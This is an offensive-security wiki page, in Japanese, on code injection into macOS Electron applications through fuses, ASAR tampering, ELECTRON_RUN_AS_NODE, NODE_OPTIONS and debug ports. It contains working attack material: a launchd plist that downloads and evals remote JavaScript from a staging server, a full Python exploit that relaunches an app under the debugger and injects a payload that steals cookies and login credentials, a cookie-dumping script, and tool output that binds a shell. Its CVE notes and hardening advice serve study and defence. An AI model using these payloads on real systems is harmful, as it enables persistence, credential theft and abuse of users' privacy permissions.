# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Electron が何か知らない場合は、[**こちらに多くの情報があります**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)。ここでは、Electron が **node** を実行することだけ覚えておいてください。\
また、node には、指定されたファイル以外の **コードを実行させる** ために使用できる **パラメータ** と **env variables** があります。

### Electron Fuses

これらの techniques については次に説明しますが、近年の Electron には、それらを防止するための複数の **security flags** が追加されています。これらが [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) であり、macOS 上の Electron apps が **arbitrary code を読み込む** のを **防止** するために使用されるものは次のとおりです:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: 無効にすると、env var **`ELECTRON_RUN_AS_NODE`** を使用した code injection を防止します。
- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect` や `--inspect-brk` などの params は適用されません。これによる code injection を防止します。
- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた **`asar`** **file** が macOS によって **検証** されます。これにより、この file の内容を変更して行う **code injection** を **防止** します。
- **`OnlyLoadAppFromAsar`**: これを有効にすると、**`app.asar`**、**`app`**、最後に **`default_app.asar`** の順で検索して読み込む代わりに、app.asar のみをチェックして使用します。これにより、**`embeddedAsarIntegrityValidation`** fuse と **組み合わせる** と、**検証されていない code を読み込む** ことが **不可能** になります。
- **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、browser process は V8 snapshot として `browser_v8_context_snapshot.bin` という file を使用します。

code injection を防止しない、もう 1 つの興味深い fuse は次のとおりです。

- **EnableCookieEncryption**: 有効にすると、disk 上の cookie store は OS level の cryptography keys を使用して暗号化されます。

### Electron Fuses の確認

application から次の方法でこれらの flags を **確認** できます:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses の変更

[**docs に記載されているように**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electron Fuses** の設定は、文字列 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** をどこかに含む **Electron binary** 内で設定されています。<sup>[[1]](#references)</sup>

macOS アプリケーションでは、通常 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` にあります。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
このファイルを [https://hexed.it/](https://hexed.it/) で開き、先ほどの文字列を検索できます。この文字列の後には、各 fuse が無効か有効かを示す ASCII の数字「0」または「1」が表示されます。16進コード（`0x30` は `0`、`0x31` は `1`）を変更することで、**fuse の値を変更**できます。

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

変更したバイトを使用してアプリケーション内の **`Electron Framework` binary** を**上書き**しようとすると、アプリは実行できなくなる点に注意してください。

## Electron Applications にコードを追加する RCE

Electron App が使用している **external JS/HTML files** が存在する可能性があるため、攻撃者はこれらのファイルにコードを inject できます。これらのファイルの signature はチェックされず、アプリのコンテキストで arbitrary code を実行できます。

> [!CAUTION]
> ただし、現時点では2つの制限があります。
>
> - App を変更するには **`kTCCServiceSystemPolicyAppBundles`** permission が**必要**なため、デフォルトではこれはもはや実行できません。
> - コンパイル済みの **`asap`** file では通常、fuse の **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** が有効になっています。
>
> そのため、この attack path はより複雑になります（または不可能になります）。

**`kTCCServiceSystemPolicyAppBundles`** の requirement は、application を別の directory（**`/tmp`** など）にコピーし、folder **`app.app/Contents`** の名前を **`app.app/NotCon`** に変更し、**malicious** code を含む **asar** file を変更してから、名前を **`app.app/Contents`** に戻して実行することで bypass できます。

次のコマンドで asar file から code を unpack できます：
```bash
npx asar extract app.asar app-decomp
```
そして、変更した後、次の方法で再パッケージ化します:
```bash
npx asar pack app-decomp app-new.asar
```
## ELECTRON_RUN_AS_NODE による RCE

[**docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) によると、この環境変数が設定されている場合、プロセスは通常の Node.js プロセスとして起動します。<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> **`RunAsNode`** fuse が無効になっている場合、env var **`ELECTRON_RUN_AS_NODE`** は無視され、この方法は機能しません。

### App Plist からの Injection

[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、この env variable を plist 内で abuse して persistence を維持できます:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS`によるRCE

payloadを別のファイルに保存して実行できます：
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> fuse **`EnableNodeOptionsEnvironmentVariable`** が **disabled** の場合、env var **NODE_OPTIONS** は、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されていない限り、アプリの起動時に **ignore** されます。また、fuse **`RunAsNode`** が **disabled** の場合、**`ELECTRON_RUN_AS_NODE`** も **ignore** されます。
>
> **`ELECTRON_RUN_AS_NODE`** を設定しない場合、次の **error** が表示されます: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App PlistからのInjection

この環境変数を plist で abuse して、次の key を追加することで persistence を維持できます:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## inspecting による RCE

[**こちら**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) によると、**`--inspect`**、**`--inspect-brk`**、**`--remote-debugging-port`** などの flags を付けて Electron application を実行すると、**debug port が開かれる**ため、そこに接続できます（例：Chrome の `chrome://inspect` から）。そして、**コードを inject** したり、新しい processes を起動したりすることさえ可能です。<sup>[[7]](#references)</sup>\
例えば:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**このブログ記事**](https://hackerone.com/reports/1274695) では、この debugging を悪用して、headless chrome に **任意のファイルを任意の場所へ download** させています。<sup>[[8]](#references)</sup>

> [!TIP]
> アプリに、`--inspect` などの env variables や params が設定されているかを確認する独自の方法がある場合は、arg `--inspect-brk` を使って runtime で **bypass** できる可能性があります。これにより、アプリの実行を開始時点で **停止** させ、bypass を実行できます（例えば、現在の process の args や env variables を上書きするなど）。

以下は exploit の例です。アプリを param `--inspect-brk` 付きで monitoring および実行すると、独自の protection を bypass できました（process の params を上書きして `--inspect-brk` を削除）。その後、JS payload を injection して、アプリから cookies と credentials を dump できました。
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> fuse **`EnableNodeCliInspectArguments`** が無効になっている場合、アプリの起動時に env variable **`ELECTRON_RUN_AS_NODE`** が設定されていない限り、アプリは **`--inspect`** などの node parameters を **無視** します。また、fuse **`RunAsNode`** が無効になっている場合は、**`ELECTRON_RUN_AS_NODE`** も **無視** されます。
>
> ただし、**electron parameter `--remote-debugging-port=9229`** は引き続き使用できます。ただし、前述の payload は他のプロセスを実行するためには機能しません。

**`--remote-debugging-port=9222`** パラメータを使用すると、Electron App から **履歴**（GET commands を使用）や browser の **cookies** などの情報を窃取できます。cookies は browser 内部で **復号化** されており、それらを取得できる **json endpoint** が存在するためです。

その方法については[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学習できます。また、automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) や、次のような simple script を使用することもできます。<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### App Plist からの Injection

plist 内のこの環境変数を悪用し、以下のキーを追加することで persistence を維持できます:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Older Versions を悪用した TCC Bypass

> [!TIP]
> macOS の TCC daemon は、application の実行された version をチェックしません。そのため、以前の techniques のいずれでも **Electron application に code を inject できない場合**、APP の以前の version を download して code を inject できます。Trust Cache によって阻止されない限り、TCC privileges は引き続き付与されます。

## JS 以外の Code を実行する

以前の techniques により、**Electron application の process 内で JS code を実行**できます。ただし、**child processes は parent application と同じ sandbox profile で実行され、TCC permissions を継承する**ことに注意してください。\
したがって、例えば entitlements を悪用して camera や microphone に access したい場合は、**process から別の binary を実行**するだけで済みます。

## 注目すべき Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 および各種 23-27 pre-releases では、`.app/Contents/Resources` folder への write access を持つ attacker が、`embeddedAsarIntegrityValidation` **および** `onlyLoadAppFromAsar` fuses を bypass できました。この bug は integrity checker における *file-type confusion* であり、検証済み archive の代わりに、細工された **`app.asar` という名前の directory** を load させることが可能でした。そのため、その directory 内に配置された任意の JavaScript が app の起動時に実行されました。したがって、hardening guidance に従い、両方の fuses を有効にしていた vendor でさえ、macOS 上では依然として vulnerable でした。<sup>[[3]](#references)</sup>

Patched Electron versions: **22.3.24**、**24.8.3**、**25.8.1**、**26.2.1**、**27.0.0-alpha.7**。Attacker が古い build で動作している application を見つけた場合、`Contents/Resources/app.asar` を独自の directory で overwrite し、application の TCC entitlements で code を実行できます。<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

2024 年 1 月、一連の CVEs (CVE-2024-23738 through CVE-2024-23743) により、多くの Electron apps が **RunAsNode** および **EnableNodeCliInspectArguments** fuses を有効なまま出荷していることが明らかになりました。そのため、local attacker は environment variable `ELECTRON_RUN_AS_NODE=1` または `--inspect-brk` などの flags を使用して program を relaunch し、これを *generic* Node.js process に変えて、application の sandbox および TCC permissions をすべて継承できます。<sup>[[4]](#references)</sup>

Electron team は “critical” rating に異議を唱え、attacker にはすでに local code-execution が必要であると指摘しましたが、この issue は post-exploitation において依然として有用です。これは、vulnerable な Electron bundle を *living-off-the-land* binary に変え、desktop app に以前付与されていた Contacts、Photos、その他の sensitive resources などを読み取れるようにするためです。<sup>[[4]](#references)</sup>

Electron maintainers による Defensive guidance:<sup>[[4]](#references)</sup>

* Production builds では `RunAsNode` および `EnableNodeCliInspectArguments` fuses を disable する。
* application が helper Node.js process を正当に必要とする場合は、それらの fuses を再度有効にする代わりに、新しい **UtilityProcess** API を使用する。

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool は、install 済みの **vulnerable electron applications を見つけて code を inject**するために簡単に使用できます。この tool は **`--inspect`** technique を使用します:

自分で compile する必要があり、次のように使用できます:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Lokiは、アプリケーションのJavaScriptファイルをLokiのCommand & Control JavaScriptファイルに置き換えることで、Electronアプリケーションをbackdoor化するよう設計されています。


## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Third-Party Frameworks経由のMacOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [filetype confusion経由のASAR Integrity bypass (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] ['runAsNode' CVEsに関する声明 - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Red Teamingの武器庫に新たな武器を - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electronアプリケーションがsecretをconfidentialに保存できない理由: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debuggingが悪用され任意のファイルをdownload](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: ChromiumのRemote Debugger PortによるCookie Dumping - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [ChromiumのRemote DebuggerによるCookie DumpingのFailureをdebugging - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
